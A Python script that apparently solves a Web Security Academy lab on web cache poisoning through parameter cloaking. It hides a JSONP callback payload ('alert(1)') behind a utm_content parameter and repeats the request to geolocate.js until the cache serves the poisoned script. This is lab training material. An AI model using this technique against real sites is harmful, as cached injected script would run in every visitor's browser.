###########################################################
#
# Lab: Parameter cloaking
#
# Hack Steps:
#      1. Inject payload as a second query parameter
#      2. Send multiple request to the geolocate.js file
#         to cache it with the injected payload
#
###########################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6f00d104c841bd80038f0a00de0031.web-security-academy.net" 

def main():
    payload = """utm_content=hack;callback=alert(1)%3bsetCountryCookie"""
    
    # 5 times is enough for caching
    # 35 times to reach the max-age and start caching again (just to make sure that the request is cached to mark the lab as solved)
    for counter in range(1,36):
        print(Fore.WHITE + f"❯❯ Poisoning the geolocate.js file using parameter cloaking ({counter}/35).. ", end="\r", flush=True)
        
        requests.get(f"{LAB_URL}/js/geolocate.js?callback=setCountryCookie&{payload}")

    print(Fore.WHITE + "❯❯ Poisoning the geolocate.js file using parameter cloaking (35/35).." + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The main page is poisoned successfully as it request the poisoned geolocate.js file")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()